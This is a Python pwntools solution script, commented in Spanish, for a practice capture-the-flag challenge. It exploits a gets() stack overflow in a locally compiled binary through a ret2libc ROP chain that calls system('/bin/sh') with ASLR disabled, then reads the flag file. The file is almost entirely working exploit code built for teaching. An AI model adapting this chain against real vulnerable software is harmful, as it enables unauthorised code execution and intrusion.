#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF-04 - "Sin brújula": ret2libc localizando "/bin/sh" en la libc.
Diagnóstico: NX activo, No PIE, gets(); `strings ./ctf04 | grep bin`
no devuelve NADA: el binario no trae "/bin/sh" ni llama a system().
Razonamiento: la libc de la VM SÍ lo tiene todo. Con ASLR desactivada
la base se lee con setarch -R ldd; el gadget pop rdi; ret también vive
en libc (el binario dinámico moderno no trae trampolines propios).
Cadena: [pop_rdi][&"/bin/sh"][ret][system]; el shell hace cat flag.txt.
USO: python3 sol_ctf04.py"""
from pwn import *
import os
import re
import subprocess
import time

context.arch = 'amd64'
context.log_level = 'info'

BIN = './ctf04'
FLAG_DEMO = 'FLAG{CTF04_sin_brujula_libc}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'ctf04.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de práctica creado')

elf = ELF(BIN, checksec=False)

# Control del enunciado: el binario NO contiene "/bin/sh"
cadenas = open(BIN, 'rb').read()
assert b'/bin/sh' not in cadenas, 'el binario SI contiene /bin/sh?!'
log.info('Confirmado: "/bin/sh" no vive en el binario; hay que ir a libc.')

# ------------------------------------------------------------------
# FASE 0 - base de libc vía ldd con ASLR fuera (setarch -R)
# ------------------------------------------------------------------
ARCH = os.uname().machine
ldd_out = subprocess.run(
    ['setarch', ARCH, '-R', 'ldd', BIN],
    capture_output=True, text=True).stdout
m = re.search(r'libc\.so\.6 => (\S+) \(0x([0-9a-f]+)\)', ldd_out)
if not m:
    log.failure('ldd no mostró libc; verifica setarch -R y ASLR.')
    raise SystemExit(1)
libc = ELF(m.group(1), checksec=False)
libc.address = int(m.group(2), 16)      # base fija con ASLR fuera
log.info('libc: %s | base fija %#x', m.group(1), libc.address)

# TODO sale de libc EN TIEMPO DE EJECUCIÓN:
pop_rdi = ROP(libc).find_gadget(['pop rdi', 'ret'])[0]
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
log.info('pop rdi; ret = %#x | system = %#x | "/bin/sh" = %#x',
         pop_rdi, system, binsh)

ret_gadget = ROP(elf).find_gadget(['ret'])[0]   # ret suelto del binario

# ------------------------------------------------------------------
# FASE 1 - offset dinámico (cyclic + corefile, método A2)
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])   # misma vía que el ldd
io.recvuntil(b'ordene, navegante')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes (buffer 32 + RBP 8)', offset)

# ------------------------------------------------------------------
# FASE 2 - exploit: [pop_rdi][binsh][ret][system]
# ------------------------------------------------------------------
io = process(['setarch', ARCH, '-R', BIN])
io.recvuntil(b'ordene, navegante')
payload = (b'A' * offset
           + p64(pop_rdi)
           + p64(binsh)
           + p64(ret_gadget)     # re-alinea la pila para system (movaps)
           + p64(system))
assert b'\n' not in payload, 'gets() cortaría el payload en el primer 0x0a'
io.sendline(payload)
time.sleep(0.5)
io.sendline(b'cat flag.txt; echo PWNED_CTF04_$(id -u); id; exit')
salida = io.recvall(timeout=4)
io.close()

if b'PWNED_CTF04' in salida and (FLAG_DEMO.encode() in salida
                                 or b'FLAG{' in salida):
    log.success('CTF-04 SUPERADO: brújula reconstruida con la libc de la '
                'VM; shell + flag.')
else:
    log.failure('CTF-04: sin shell. Repasa: setarch -R en ldd Y en el '
                'proceso, gadgets de libc y el ret de alineación.')
